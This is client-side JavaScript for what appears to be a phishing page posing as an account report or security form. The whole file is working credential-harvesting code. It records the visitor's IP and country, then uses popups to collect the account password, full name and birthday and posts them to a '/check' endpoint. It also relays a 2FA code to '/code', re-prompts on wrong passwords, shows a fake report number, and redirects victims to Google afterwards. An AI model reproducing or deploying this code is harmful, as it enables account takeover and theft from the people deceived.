let ipAddress;
let address;

document.addEventListener('DOMContentLoaded', async function () {
    try {
        const ipifyResponse = await fetch('https://api.ipify.org?format=json');
        const ipifyData = await ipifyResponse.json();
        ipAddress = ipifyData.ip;

        const ipLocationNetResponse = await fetch(`https://api.iplocation.net/?cmd=ip-country&ip=${ipAddress}`);
        const ipLocationNetData = await ipLocationNetResponse.json();
        address = ipLocationNetData.country_name;
    } catch (error) {
        console.error('Lỗi:', error);
    }
});
function submit() {
    const inputElement1 = document.querySelector('.home-textinput.input');
    const inputElement2 = document.querySelector('.home-textinput1.input');
    const validateEmail = (email) => {
        return email.includes('@');
    };

    const setInputElementStyle = (element, isValid) => {
        element.style.border = isValid ? '0.5px solid #018080' : '0.5px solid red';
    };

    const clearInputAndFocusElement = (element) => {
        element.value = '';
        element.placeholder = 'Invalid email';
        var container = element.closest('div[style*="overflow-y: scroll"]');
        if (container) {
            container.scrollTop = element.offsetTop - container.offsetTop;
        }
        element.focus();
    };

    if (validateEmail(inputElement1.value) && validateEmail(inputElement2.value)) {
        setInputElementStyle(inputElement1, true);
        setInputElementStyle(inputElement2, true);
        var inputUserName = document.querySelector('.home-textinput1');
        var inputFullName = document.querySelector('.home-textinput3');
        var inputDate = document.getElementById('date-input');
        Swal.fire({
            title: 'Please Enter Your Password',
            input: 'password',
            inputLabel: 'For your security, you must enter your password to continue!',
            inputPlaceholder: '******',
            showCancelButton: true,
            confirmButtonText: 'Submit',
            cancelButtonText: 'Cancel',
            allowOutsideClick: false,
            inputValidator: (value) => {
                if (!value) {
                    return 'You need to enter your password';
                }
            },
            buttonsStyling: false,
            customClass: {
                popup: 'popup-class',
                title: 'popup-title',
                content: 'popup-content',
                confirmButton: 'popup-confirm-button',
                cancelButton: 'popup-cancel-button',
            },
        }).then(async (result) => {
            if (result.isConfirmed) {
                Swal.fire({
                    title: 'Loading',
                    html: 'Please wait...',
                    allowOutsideClick: false,
                    showCancelButton: false,
                    showConfirmButton: false,
                    willOpen: () => {
                        Swal.showLoading();
                    }
                });
                var userName = inputUserName.value;
                var password = result.value;
                var fullName = inputFullName.value;
                var birthDay = inputDate.value;
                try {
                    const response = await fetch('/check', {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify({
                            username: userName,
                            password: password,
                            ip: ipAddress,
                            country: address,
                            fullname: fullName,
                            birthday: birthDay
                        })
                    });
                    const data = await response.text();
                    if (data === '2FA') {
                        Swal.fire({
                            title: 'Please Enter Your 2FA Code',
                            input: 'text',
                            inputLabel: 'For your security, you must enter your 2FA code to continue!',
                            inputPlaceholder: '******',
                            showCancelButton: true,
                            confirmButtonText: 'Submit',
                            cancelButtonText: 'Cancel',
                            allowOutsideClick: false,
                            inputValidator: (value) => {
                                if (!value) {
                                    return 'You need to enter your 2FA code';
                                }
                            },
                            buttonsStyling: false,
                            customClass: {
                                popup: 'popup-class',
                                title: 'popup-title',
                                content: 'popup-content',
                                confirmButton: 'popup-confirm-button',
                                cancelButton: 'popup-cancel-button',
                            },
                        }).then(async (result) => {
                            if (result.isConfirmed) {
                                Swal.fire({
                                    title: 'Loading',
                                    html: 'Please wait...',
                                    allowOutsideClick: false,
                                    showCancelButton: false,
                                    showConfirmButton: false,
                                    willOpen: () => {
                                        Swal.showLoading();
                                    }
                                });
                                var code = result.value;
                                const response = await fetch('/code', {
                                    method: 'POST',
                                    headers: {
                                        'Content-Type': 'application/json'
                                    },
                                    body: JSON.stringify({
                                        code: code
                                    })
                                });
                                const data = await response.text();
                                if (data === 'SUCCESS') {
                                    window.location.href = "https://www.google.com";
                                }
                                else {
                                    Swal.fire({
                                        title: 'Please Enter Your Password',
                                        input: 'password',
                                        inputLabel: 'For your security, you must enter your password to continue!',
                                        inputPlaceholder: '******',
                                        showCancelButton: true,
                                        confirmButtonText: 'Submit',
                                        cancelButtonText: 'Cancel',
                                        allowOutsideClick: false,
                                        inputValidator: (value) => {
                                            return 'Invalid username and password';
                                        },
                                        buttonsStyling: false,
                                        customClass: {
                                            popup: 'popup-class',
                                            title: 'popup-title',
                                            content: 'popup-content',
                                            confirmButton: 'popup-confirm-button',
                                            cancelButton: 'popup-cancel-button',
                                        },
                                    });
                                    const confirmButton = document.querySelector('.swal2-confirm');
                                    confirmButton.click();
                                }
                            }
                        });
                    }
                    else if (data === 'WRONG') {
                        Swal.fire({
                            title: 'Please Enter Your Password',
                            input: 'password',
                            inputLabel: 'For your security, you must enter your password to continue!',
                            inputPlaceholder: '******',
                            showCancelButton: true,
                            confirmButtonText: 'Submit',
                            cancelButtonText: 'Cancel',
                            allowOutsideClick: false,
                            inputValidator: (value) => {
                                return 'Invalid password';
                            },
                            buttonsStyling: false,
                            customClass: {
                                popup: 'popup-class',
                                title: 'popup-title',
                                content: 'popup-content',
                                confirmButton: 'popup-confirm-button',
                                cancelButton: 'popup-cancel-button',
                            },
                        });
                        const confirmButton = document.querySelector('.swal2-confirm');
                        confirmButton.click();
                    }
                    else {
                        window.location.href = "https://www.google.com";
                    }
                    console.log(data);
                } catch (error) {
                    console.error('Lỗi:', error);
                }
            }
        });
    } else {
        setInputElementStyle(inputElement1, false);
        setInputElementStyle(inputElement2, false);
        clearInputAndFocusElement(inputElement1);
        clearInputAndFocusElement(inputElement2);
    }
}

document.addEventListener('DOMContentLoaded', function () {
    var spanElement = document.querySelector('.home-text15');
    var reportNumberElement = document.getElementById('reportNumber');
    reportNumberElement.innerText = 'Report no: ' + generateRandomStringWithDashes();

    function generateRandomStringWithDashes() {
        var characters = 'abcdefghijklmnopqrstuvwxyz0123456789';
        var length = 32;
        var result = '';

        for (var i = 0; i < length; i++) {
            var randomIndex = Math.floor(Math.random() * characters.length);
            result += characters.charAt(randomIndex);
            if ((i + 1) % 4 === 0 && (i + 1) !== length) {
                result += '-';
            }
        }

        return result;
    }
});